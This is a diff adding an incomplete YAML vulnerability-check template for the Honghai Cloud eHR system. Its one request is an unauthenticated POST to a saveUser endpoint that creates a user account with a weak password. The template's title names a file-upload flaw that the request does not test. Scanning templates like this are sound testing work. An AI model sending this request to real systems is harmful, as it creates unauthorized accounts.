@@ -1,0 +1,24 @@
+id:
+
+info:
+  name: 红海云eHR 任意文件上传漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /api/personSeal_jdy/saveUser.htm
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+    Accept-Encoding: gzip, deflate
+    Accept: '*/*'
+    Content-Type: application/json
+  data: |
+    {"op":{},"data":{"mobile":"14333333333","uid":"14333333333","password":"123456","name":"ceshi","return_url":"https://www.baidu.com","apisecretkey":"1","_id":"1","mail_address":"111@qq.com"},"b7o4ntosbfp":"="}
+response1:
+  headers:
+  body: '"code": 200'
+  code: 200
+requests2:
+response2:
